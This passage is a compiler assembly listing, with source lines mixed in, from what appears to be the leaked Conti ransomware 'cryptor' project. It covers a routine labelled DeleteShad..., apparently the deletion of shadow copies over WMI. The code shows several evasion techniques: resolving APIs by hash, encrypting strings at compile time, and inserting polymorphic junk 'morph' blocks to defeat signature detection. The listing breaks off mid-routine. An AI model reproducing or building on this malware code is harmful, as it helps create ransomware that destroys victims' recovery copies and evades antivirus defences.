  009fe	44 89 7c 24 20	 mov	 DWORD PTR [rsp+32], r15d
  00a03	41 8d 51 0a	 lea	 edx, QWORD PTR [r9+10]
  00a07	ff d0		 call	 rax
  00a09	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00a0c	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$12[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00a14	8b 7c 24 50	 mov	 edi, DWORD PTR _morph_var$12[rsp]
  00a18	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00a1d	f7 ef		 imul	 edi
  00a1f	8b ca		 mov	 ecx, edx
  00a21	c1 e9 1f	 shr	 ecx, 31
  00a24	03 d1		 add	 edx, ecx
  00a26	8d 0c 52	 lea	 ecx, DWORD PTR [rdx+rdx*2]
  00a29	3b f9		 cmp	 edi, ecx
  00a2b	74 55		 je	 SHORT $LN810@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  00a2d	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$12[rsp]
  00a31	83 c1 02	 add	 ecx, 2
  00a34	41 03 c8	 add	 ecx, r8d
  00a37	89 4c 24 50	 mov	 DWORD PTR _morph_var$12[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00a3b	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$12[rsp]
  00a3f	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00a44	7d 07		 jge	 SHORT $LN1451@DeleteShad
  00a46	ff c8		 dec	 eax
  00a48	83 c8 fc	 or	 eax, -4
  00a4b	ff c0		 inc	 eax
$LN1451@DeleteShad:
  00a4d	85 c0		 test	 eax, eax
  00a4f	0f 85 7f 00 00
	00		 jne	 $LN809@DeleteShad
  00a55	66 66 66 0f 1f
	84 00 00 00 00
	00		 npad	 11
$LL802@DeleteShad:
  00a60	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$12[rsp]
  00a64	ff c0		 inc	 eax
  00a66	89 44 24 50	 mov	 DWORD PTR _morph_var$12[rsp], eax
  00a6a	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$12[rsp]
  00a6e	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00a73	7d 07		 jge	 SHORT $LN1450@DeleteShad
  00a75	ff c8		 dec	 eax
  00a77	83 c8 fc	 or	 eax, -4
  00a7a	ff c0		 inc	 eax
$LN1450@DeleteShad:
  00a7c	85 c0		 test	 eax, eax
  00a7e	74 e0		 je	 SHORT $LL802@DeleteShad

; 51   : 	}

  00a80	eb 52		 jmp	 SHORT $LN809@DeleteShad
$LN810@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  00a82	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$12[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00a86	b9 02 00 00 00	 mov	 ecx, 2
  00a8b	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$12[rsp]
  00a8f	41 2b c8	 sub	 ecx, r8d
  00a92	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00a94	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00a99	89 4c 24 50	 mov	 DWORD PTR _morph_var$12[rsp], ecx
  00a9d	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$12[rsp]
  00aa1	f7 e9		 imul	 ecx
  00aa3	8b c2		 mov	 eax, edx
  00aa5	c1 e8 1f	 shr	 eax, 31
  00aa8	03 d0		 add	 edx, eax
  00aaa	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00aad	3b c8		 cmp	 ecx, eax
  00aaf	75 23		 jne	 SHORT $LN809@DeleteShad
$LL804@DeleteShad:
  00ab1	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$12[rsp]
  00ab5	ff c0		 inc	 eax
  00ab7	89 44 24 50	 mov	 DWORD PTR _morph_var$12[rsp], eax
  00abb	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00ac0	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$12[rsp]
  00ac4	f7 e9		 imul	 ecx
  00ac6	8b c2		 mov	 eax, edx
  00ac8	c1 e8 1f	 shr	 eax, 31
  00acb	03 d0		 add	 edx, eax
  00acd	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00ad0	3b c8		 cmp	 ecx, eax
  00ad2	74 dd		 je	 SHORT $LL804@DeleteShad
$LN809@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 194  : 	if (FAILED(hres))

  00ad4	45 85 c0	 test	 r8d, r8d
  00ad7	79 37		 jns	 SHORT $LN10@DeleteShad

; 195  : 	{
; 196  : 		pSvc->Release();

  00ad9	48 8b 8d a0 00
	00 00		 mov	 rcx, QWORD PTR pSvc$[rbp-256]
  00ae0	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  00ae3	ff 50 10	 call	 QWORD PTR [rax+16]
$LN1683@DeleteShad:

; 197  : 		pLoc->Release();

  00ae6	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR pLoc$[rbp-256]
  00aed	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  00af0	ff 50 10	 call	 QWORD PTR [rax+16]
$LN1684@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 770  : 	pFunction = (VOID(WINAPI*)())getapi::GetProcAddressEx2(NULL, OLE32_MODULE_ID, 0x68cc2bb5, 1);//GetProcAddress(hOle32, OBFA("CoUninitialize"));

  00af3	45 8b ce	 mov	 r9d, r14d
  00af6	ba 18 00 00 00	 mov	 edx, 24
  00afb	41 b8 b5 2b cc
	68		 mov	 r8d, 1758210997		; 68cc2bb5H
  00b01	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 771  : 	return pFunction();

  00b06	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 199  : 		return FALSE;               // Program has failed.

  00b08	0f b7 c6	 movzx	 eax, si
  00b0b	e9 8f 0c 00 00	 jmp	 $LN1681@DeleteShad
$LN10@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00b10	40 88 74 24 60	 mov	 BYTE PTR $T3[rsp], sil
  00b15	c6 44 24 61 56	 mov	 BYTE PTR $T3[rsp+1], 86	; 00000056H
  00b1a	c6 44 24 62 21	 mov	 BYTE PTR $T3[rsp+2], 33	; 00000021H
  00b1f	c6 44 24 63 71	 mov	 BYTE PTR $T3[rsp+3], 113 ; 00000071H
  00b24	c6 44 24 64 21	 mov	 BYTE PTR $T3[rsp+4], 33	; 00000021H
  00b29	c6 44 24 65 48	 mov	 BYTE PTR $T3[rsp+5], 72	; 00000048H
  00b2e	c6 44 24 66 21	 mov	 BYTE PTR $T3[rsp+6], 33	; 00000021H
  00b33	c6 44 24 67 21	 mov	 BYTE PTR $T3[rsp+7], 33	; 00000021H
  00b38	c6 44 24 68 21	 mov	 BYTE PTR $T3[rsp+8], 33	; 00000021H
  00b3d	0f b6 44 24 61	 movzx	 eax, BYTE PTR $T3[rsp+1]

; 58   :         return m_isDecrypted;

  00b42	0f b6 44 24 60	 movzx	 eax, BYTE PTR $T3[rsp]

; 63   :         if (!isDecrypted())

  00b47	84 c0		 test	 al, al
  00b49	75 50		 jne	 SHORT $LN1039@DeleteShad

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00b4b	48 8b fe	 mov	 rdi, rsi
  00b4e	66 90		 npad	 2
$LL1040@DeleteShad:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00b50	0f b6 4c 3c 61	 movzx	 ecx, BYTE PTR $T3[rsp+rdi+1]

; 40   :     return (a % n + n) % n;

  00b55	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00b5a	83 e9 21	 sub	 ecx, 33			; 00000021H
  00b5d	6b c9 1c	 imul	 ecx, ecx, 28

; 40   :     return (a % n + n) % n;

  00b60	f7 e9		 imul	 ecx
  00b62	03 d1		 add	 edx, ecx
  00b64	c1 fa 06	 sar	 edx, 6
  00b67	8b c2		 mov	 eax, edx
  00b69	c1 e8 1f	 shr	 eax, 31
  00b6c	03 d0		 add	 edx, eax
  00b6e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00b71	2b c8		 sub	 ecx, eax
  00b73	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00b78	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00b7b	f7 e9		 imul	 ecx
  00b7d	03 d1		 add	 edx, ecx
  00b7f	c1 fa 06	 sar	 edx, 6
  00b82	8b c2		 mov	 eax, edx
  00b84	c1 e8 1f	 shr	 eax, 31
  00b87	03 d0		 add	 edx, eax
  00b89	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00b8c	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00b8e	88 4c 3c 61	 mov	 BYTE PTR $T3[rsp+rdi+1], cl
  00b92	48 ff c7	 inc	 rdi
  00b95	48 83 ff 08	 cmp	 rdi, 8
  00b99	72 b5		 jb	 SHORT $LL1040@DeleteShad
$LN1039@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1042 : 	pFunction = (BSTR(WINAPI*)(const OLECHAR*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0x54def57d, 20);

  00b9b	ba 19 00 00 00	 mov	 edx, 25
  00ba0	41 b8 7d f5 de
	54		 mov	 r8d, 1423897981		; 54def57dH
  00ba6	44 8d 4a fb	 lea	 r9d, QWORD PTR [rdx-5]
  00baa	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1043 : 	return pFunction(psz);

  00baf	48 8d 4c 24 61	 lea	 rcx, QWORD PTR $T3[rsp+1]
  00bb4	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  00bb6	40 88 75 b8	 mov	 BYTE PTR $T4[rbp-256], sil
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1043 : 	return pFunction(psz);

  00bba	48 8b d8	 mov	 rbx, rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  00bbd	c6 45 b9 6d	 mov	 BYTE PTR $T4[rbp-255], 109 ; 0000006dH
  00bc1	c6 45 ba 1c	 mov	 BYTE PTR $T4[rbp-254], 28
  00bc5	c6 45 bb 02	 mov	 BYTE PTR $T4[rbp-253], 2
  00bc9	c6 45 bc 1c	 mov	 BYTE PTR $T4[rbp-252], 28
  00bcd	c6 45 bd 77	 mov	 BYTE PTR $T4[rbp-251], 119 ; 00000077H
  00bd1	c6 45 be 1c	 mov	 BYTE PTR $T4[rbp-250], 28
  00bd5	c6 45 bf 02	 mov	 BYTE PTR $T4[rbp-249], 2
  00bd9	c6 45 c0 1c	 mov	 BYTE PTR $T4[rbp-248], 28
  00bdd	c6 45 c1 17	 mov	 BYTE PTR $T4[rbp-247], 23
  00be1	c6 45 c2 1c	 mov	 BYTE PTR $T4[rbp-246], 28
  00be5	c6 45 c3 23	 mov	 BYTE PTR $T4[rbp-245], 35 ; 00000023H
  00be9	c6 45 c4 1c	 mov	 BYTE PTR $T4[rbp-244], 28
  00bed	c6 45 c5 49	 mov	 BYTE PTR $T4[rbp-243], 73 ; 00000049H
  00bf1	c6 45 c6 1c	 mov	 BYTE PTR $T4[rbp-242], 28
  00bf5	c6 45 c7 5f	 mov	 BYTE PTR $T4[rbp-241], 95 ; 0000005fH
  00bf9	c6 45 c8 1c	 mov	 BYTE PTR $T4[rbp-240], 28
  00bfd	c6 45 c9 49	 mov	 BYTE PTR $T4[rbp-239], 73 ; 00000049H
  00c01	c6 45 ca 1c	 mov	 BYTE PTR $T4[rbp-238], 28
  00c05	c6 45 cb 37	 mov	 BYTE PTR $T4[rbp-237], 55 ; 00000037H
  00c09	c6 45 cc 1c	 mov	 BYTE PTR $T4[rbp-236], 28
  00c0d	c6 45 cd 38	 mov	 BYTE PTR $T4[rbp-235], 56 ; 00000038H
  00c11	c6 45 ce 1c	 mov	 BYTE PTR $T4[rbp-234], 28
  00c15	c6 45 cf 18	 mov	 BYTE PTR $T4[rbp-233], 24
  00c19	c6 45 d0 1c	 mov	 BYTE PTR $T4[rbp-232], 28
  00c1d	c6 45 d1 2d	 mov	 BYTE PTR $T4[rbp-231], 45 ; 0000002dH
  00c21	c6 45 d2 1c	 mov	 BYTE PTR $T4[rbp-230], 28
  00c25	c6 45 d3 49	 mov	 BYTE PTR $T4[rbp-229], 73 ; 00000049H
  00c29	c6 45 d4 1c	 mov	 BYTE PTR $T4[rbp-228], 28
  00c2d	c6 45 d5 43	 mov	 BYTE PTR $T4[rbp-227], 67 ; 00000043H
  00c31	c6 45 d6 1c	 mov	 BYTE PTR $T4[rbp-226], 28
  00c35	c6 45 d7 05	 mov	 BYTE PTR $T4[rbp-225], 5
  00c39	c6 45 d8 1c	 mov	 BYTE PTR $T4[rbp-224], 28
  00c3d	c6 45 d9 10	 mov	 BYTE PTR $T4[rbp-223], 16
  00c41	c6 45 da 1c	 mov	 BYTE PTR $T4[rbp-222], 28
  00c45	c6 45 db 40	 mov	 BYTE PTR $T4[rbp-221], 64 ; 00000040H
  00c49	c6 45 dc 1c	 mov	 BYTE PTR $T4[rbp-220], 28
  00c4d	c6 45 dd 0b	 mov	 BYTE PTR $T4[rbp-219], 11
  00c51	c6 45 de 1c	 mov	 BYTE PTR $T4[rbp-218], 28
  00c55	c6 45 df 6e	 mov	 BYTE PTR $T4[rbp-217], 110 ; 0000006eH
  00c59	c6 45 e0 1c	 mov	 BYTE PTR $T4[rbp-216], 28
  00c5d	c6 45 e1 6d	 mov	 BYTE PTR $T4[rbp-215], 109 ; 0000006dH
  00c61	c6 45 e2 1c	 mov	 BYTE PTR $T4[rbp-214], 28
  00c65	c6 45 e3 4f	 mov	 BYTE PTR $T4[rbp-213], 79 ; 0000004fH
  00c69	c6 45 e4 1c	 mov	 BYTE PTR $T4[rbp-212], 28
  00c6d	c6 45 e5 59	 mov	 BYTE PTR $T4[rbp-211], 89 ; 00000059H
  00c71	c6 45 e6 1c	 mov	 BYTE PTR $T4[rbp-210], 28
  00c75	c6 45 e7 79	 mov	 BYTE PTR $T4[rbp-209], 121 ; 00000079H
  00c79	c6 45 e8 1c	 mov	 BYTE PTR $T4[rbp-208], 28
  00c7d	c6 45 e9 45	 mov	 BYTE PTR $T4[rbp-207], 69 ; 00000045H
  00c81	c6 45 ea 1c	 mov	 BYTE PTR $T4[rbp-206], 28
  00c85	c6 45 eb 70	 mov	 BYTE PTR $T4[rbp-205], 112 ; 00000070H
  00c89	c6 45 ec 1c	 mov	 BYTE PTR $T4[rbp-204], 28
  00c8d	c6 45 ed 17	 mov	 BYTE PTR $T4[rbp-203], 23
  00c91	c6 45 ee 1c	 mov	 BYTE PTR $T4[rbp-202], 28
  00c95	c6 45 ef 45	 mov	 BYTE PTR $T4[rbp-201], 69 ; 00000045H
  00c99	c6 45 f0 1c	 mov	 BYTE PTR $T4[rbp-200], 28
  00c9d	c6 45 f1 7a	 mov	 BYTE PTR $T4[rbp-199], 122 ; 0000007aH
  00ca1	c6 45 f2 1c	 mov	 BYTE PTR $T4[rbp-198], 28
  00ca5	c6 45 f3 5b	 mov	 BYTE PTR $T4[rbp-197], 91 ; 0000005bH
  00ca9	c6 45 f4 1c	 mov	 BYTE PTR $T4[rbp-196], 28
  00cad	c6 45 f5 1c	 mov	 BYTE PTR $T4[rbp-195], 28
  00cb1	c6 45 f6 1c	 mov	 BYTE PTR $T4[rbp-194], 28
  00cb5	0f b6 45 b9	 movzx	 eax, BYTE PTR $T4[rbp-255]

; 58   :         return m_isDecrypted;

  00cb9	0f b6 45 b8	 movzx	 eax, BYTE PTR $T4[rbp-256]

; 63   :         if (!isDecrypted())

  00cbd	84 c0		 test	 al, al
  00cbf	75 5d		 jne	 SHORT $LN984@DeleteShad

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00cc1	48 8b fe	 mov	 rdi, rsi
  00cc4	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL985@DeleteShad:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00cd0	0f b6 4c 3d b9	 movzx	 ecx, BYTE PTR $T4[rbp+rdi-255]

; 40   :     return (a % n + n) % n;

  00cd5	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00cda	83 e9 1c	 sub	 ecx, 28
  00cdd	8d 0c 49	 lea	 ecx, DWORD PTR [rcx+rcx*2]
  00ce0	c1 e1 02	 shl	 ecx, 2

; 40   :     return (a % n + n) % n;

  00ce3	f7 e9		 imul	 ecx
  00ce5	03 d1		 add	 edx, ecx
  00ce7	c1 fa 06	 sar	 edx, 6
  00cea	8b c2		 mov	 eax, edx
  00cec	c1 e8 1f	 shr	 eax, 31
  00cef	03 d0		 add	 edx, eax
  00cf1	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00cf4	2b c8		 sub	 ecx, eax
  00cf6	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  00cfb	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00cfe	f7 e9		 imul	 ecx
  00d00	03 d1		 add	 edx, ecx
  00d02	c1 fa 06	 sar	 edx, 6
  00d05	8b c2		 mov	 eax, edx
  00d07	c1 e8 1f	 shr	 eax, 31
  00d0a	03 d0		 add	 edx, eax
  00d0c	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00d0f	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00d11	88 4c 3d b9	 mov	 BYTE PTR $T4[rbp+rdi-255], cl
  00d15	48 ff c7	 inc	 rdi
  00d18	48 83 ff 3e	 cmp	 rdi, 62			; 0000003eH
  00d1c	72 b2		 jb	 SHORT $LL985@DeleteShad
$LN984@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\api\getapi.h

; 1042 : 	pFunction = (BSTR(WINAPI*)(const OLECHAR*))getapi::GetProcAddressEx2(NULL, OLEAUT32_MODULE_ID, 0x54def57d, 20);

  00d1e	ba 19 00 00 00	 mov	 edx, 25
  00d23	41 b8 7d f5 de
	54		 mov	 r8d, 1423897981		; 54def57dH
  00d29	44 8d 4a fb	 lea	 r9d, QWORD PTR [rdx-5]
  00d2d	e8 00 00 00 00	 call	 ?GetProcAddressEx2@getapi@@YAPEAXPEADKKH@Z ; getapi::GetProcAddressEx2

; 1043 : 	return pFunction(psz);

  00d32	48 8d 4d b9	 lea	 rcx, QWORD PTR $T4[rbp-255]
  00d36	ff d0		 call	 rax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 210  : 	hres = pSvc->ExecQuery(

  00d38	48 8b 8d a0 00
	00 00		 mov	 rcx, QWORD PTR pSvc$[rbp-256]
  00d3f	48 8d 95 b8 00
	00 00		 lea	 rdx, QWORD PTR pEnumerator$[rbp-256]
  00d46	48 89 54 24 28	 mov	 QWORD PTR [rsp+40], rdx
  00d4b	41 b9 30 00 00
	00		 mov	 r9d, 48			; 00000030H
  00d51	48 89 b5 b8 00
	00 00		 mov	 QWORD PTR pEnumerator$[rbp-256], rsi
  00d58	4c 8b c0	 mov	 r8, rax
  00d5b	48 8b d3	 mov	 rdx, rbx
  00d5e	48 89 74 24 20	 mov	 QWORD PTR [rsp+32], rsi
  00d63	48 8b 39	 mov	 rdi, QWORD PTR [rcx]
  00d66	ff 97 a0 00 00
	00		 call	 QWORD PTR [rdi+160]
  00d6c	44 8b c0	 mov	 r8d, eax
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00d6f	c7 44 24 50 c1
	9b 17 00	 mov	 DWORD PTR _morph_var$8[rsp], 1547201 ; 00179bc1H

; 48   : 	if (_morph_var % 3) {

  00d77	8b 7c 24 50	 mov	 edi, DWORD PTR _morph_var$8[rsp]
  00d7b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00d80	f7 ef		 imul	 edi
  00d82	8b ca		 mov	 ecx, edx
  00d84	c1 e9 1f	 shr	 ecx, 31
  00d87	03 d1		 add	 edx, ecx
  00d89	8d 0c 52	 lea	 ecx, DWORD PTR [rdx+rdx*2]
  00d8c	3b f9		 cmp	 edi, ecx
  00d8e	74 52		 je	 SHORT $LN1005@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  00d90	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$8[rsp]
  00d94	83 c1 02	 add	 ecx, 2
  00d97	41 03 c8	 add	 ecx, r8d
  00d9a	89 4c 24 50	 mov	 DWORD PTR _morph_var$8[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00d9e	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$8[rsp]
  00da2	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00da7	7d 07		 jge	 SHORT $LN1448@DeleteShad
  00da9	ff c8		 dec	 eax
  00dab	83 c8 fc	 or	 eax, -4
  00dae	ff c0		 inc	 eax
$LN1448@DeleteShad:
  00db0	85 c0		 test	 eax, eax
  00db2	0f 85 7c 00 00
	00		 jne	 $LN1004@DeleteShad
  00db8	0f 1f 84 00 00
	00 00 00	 npad	 8
$LL997@DeleteShad:
  00dc0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$8[rsp]
  00dc4	ff c0		 inc	 eax
  00dc6	89 44 24 50	 mov	 DWORD PTR _morph_var$8[rsp], eax
  00dca	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$8[rsp]
  00dce	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00dd3	7d 07		 jge	 SHORT $LN1447@DeleteShad
  00dd5	ff c8		 dec	 eax
  00dd7	83 c8 fc	 or	 eax, -4
  00dda	ff c0		 inc	 eax
$LN1447@DeleteShad:
  00ddc	85 c0		 test	 eax, eax
  00dde	74 e0		 je	 SHORT $LL997@DeleteShad

; 51   : 	}

  00de0	eb 52		 jmp	 SHORT $LN1004@DeleteShad
$LN1005@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  00de2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$8[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00de6	b9 02 00 00 00	 mov	 ecx, 2
  00deb	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$8[rsp]
  00def	41 2b c8	 sub	 ecx, r8d
  00df2	03 c8		 add	 ecx, eax

; 54   : 		while (!(_morph_var % 3)) ++_morph_var;

  00df4	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00df9	89 4c 24 50	 mov	 DWORD PTR _morph_var$8[rsp], ecx
  00dfd	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$8[rsp]
  00e01	f7 e9		 imul	 ecx
  00e03	8b c2		 mov	 eax, edx
  00e05	c1 e8 1f	 shr	 eax, 31
  00e08	03 d0		 add	 edx, eax
  00e0a	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00e0d	3b c8		 cmp	 ecx, eax
  00e0f	75 23		 jne	 SHORT $LN1004@DeleteShad
$LL999@DeleteShad:
  00e11	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$8[rsp]
  00e15	ff c0		 inc	 eax
  00e17	89 44 24 50	 mov	 DWORD PTR _morph_var$8[rsp], eax
  00e1b	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
  00e20	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$8[rsp]
  00e24	f7 e9		 imul	 ecx
  00e26	8b c2		 mov	 eax, edx
  00e28	c1 e8 1f	 shr	 eax, 31
  00e2b	03 d0		 add	 edx, eax
  00e2d	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00e30	3b c8		 cmp	 ecx, eax
  00e32	74 dd		 je	 SHORT $LL999@DeleteShad
$LN1004@DeleteShad:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 219  : 	if (FAILED(hres))

  00e34	45 85 c0	 test	 r8d, r8d
  00e37	79 1f		 jns	 SHORT $LN11@DeleteShad

; 220  : 	{
; 221  : 		pSvc->Release();

  00e39	48 8b 8d a0 00
	00 00		 mov	 rcx, QWORD PTR pSvc$[rbp-256]
  00e40	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  00e43	ff 50 10	 call	 QWORD PTR [rax+16]

; 222  : 		pLoc->Release();

  00e46	48 8b 8d a8 00
	00 00		 mov	 rcx, QWORD PTR pLoc$[rbp-256]
  00e4d	48 8b 01	 mov	 rax, QWORD PTR [rcx]
  00e50	ff 50 10	 call	 QWORD PTR [rax+16]

; 223  : 		pCoUninitialize();
; 224  : 		return 1;               // Program has failed.

  00e53	e9 2e 09 00 00	 jmp	 $LN1682@DeleteShad
$LN11@DeleteShad:

; 225  : 	}
; 226  : 
; 227  : 	// Step 7: -------------------------------------------------
; 228  : 	// Get the data from the query in step 6 -------------------
; 229  : 
; 230  : 	IWbemClassObject* pclsObj = NULL;

  00e58	48 89 b5 c8 00
	00 00		 mov	 QWORD PTR pclsObj$[rbp-256], rsi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 48   : 	if (_morph_var % 3) {

  00e5f	b8 56 55 55 55	 mov	 eax, 1431655766		; 55555556H
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\cryptor.cpp

; 231  : 	ULONG uReturn = 0;

  00e64	89 b5 e8 00 00
	00		 mov	 DWORD PTR uReturn$[rbp-256], esi
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\mrph.h

; 40   : 	volatile int _morph_var = static_cast<int>(1 + MetaRandom2<0, 0x7FFFFF - 1>::value);

  00e6a	89 7c 24 50	 mov	 DWORD PTR _morph_var$7[rsp], edi

; 48   : 	if (_morph_var % 3) {

  00e6e	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$7[rsp]
  00e72	f7 e9		 imul	 ecx
  00e74	8b c2		 mov	 eax, edx
  00e76	c1 e8 1f	 shr	 eax, 31
  00e79	03 d0		 add	 edx, eax
  00e7b	8d 04 52	 lea	 eax, DWORD PTR [rdx+rdx*2]
  00e7e	3b c8		 cmp	 ecx, eax
  00e80	74 50		 je	 SHORT $LN1192@DeleteShad

; 49   : 		_morph_var += (int)a + 2;

  00e82	8b 4c 24 50	 mov	 ecx, DWORD PTR _morph_var$7[rsp]
  00e86	8b 85 b8 00 00
	00		 mov	 eax, DWORD PTR pEnumerator$[rbp-256]
  00e8c	83 c0 02	 add	 eax, 2
  00e8f	03 c8		 add	 ecx, eax
  00e91	89 4c 24 50	 mov	 DWORD PTR _morph_var$7[rsp], ecx

; 50   : 		while (!(_morph_var % 4)) ++_morph_var;

  00e95	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$7[rsp]
  00e99	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00e9e	7d 07		 jge	 SHORT $LN1445@DeleteShad
  00ea0	ff c8		 dec	 eax
  00ea2	83 c8 fc	 or	 eax, -4
  00ea5	ff c0		 inc	 eax
$LN1445@DeleteShad:
  00ea7	85 c0		 test	 eax, eax
  00ea9	0f 85 84 00 00
	00		 jne	 $LN1250@DeleteShad
  00eaf	90		 npad	 1
$LL1184@DeleteShad:
  00eb0	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$7[rsp]
  00eb4	ff c0		 inc	 eax
  00eb6	89 44 24 50	 mov	 DWORD PTR _morph_var$7[rsp], eax
  00eba	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$7[rsp]
  00ebe	25 03 00 00 80	 and	 eax, -2147483645	; ffffffff80000003H
  00ec3	7d 07		 jge	 SHORT $LN1444@DeleteShad
  00ec5	ff c8		 dec	 eax
  00ec7	83 c8 fc	 or	 eax, -4
  00eca	ff c0		 inc	 eax
$LN1444@DeleteShad:
  00ecc	85 c0		 test	 eax, eax
  00ece	74 e0		 je	 SHORT $LL1184@DeleteShad

; 51   : 	}

  00ed0	eb 61		 jmp	 SHORT $LN1250@DeleteShad
$LN1192@DeleteShad:

; 52   : 	else if (_morph_var % 2) {

  00ed2	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$7[rsp]

; 53   : 		_morph_var -= (int)a - 2;

  00ed6	b9 02 00 00 00	 mov	 ecx, 2
  00edb	2b 8d b8 00 00
	00		 sub	 ecx, DWORD PTR pEnumerator$[rbp-256]
  00ee1	8b 44 24 50	 mov	 eax, DWORD PTR _morph_var$7[rsp]
  00ee5	03 c1		 add	 eax, ecx
  00ee7	89 44 24 50	 mov	 DWORD PTR _morph_var$7[rsp], eax

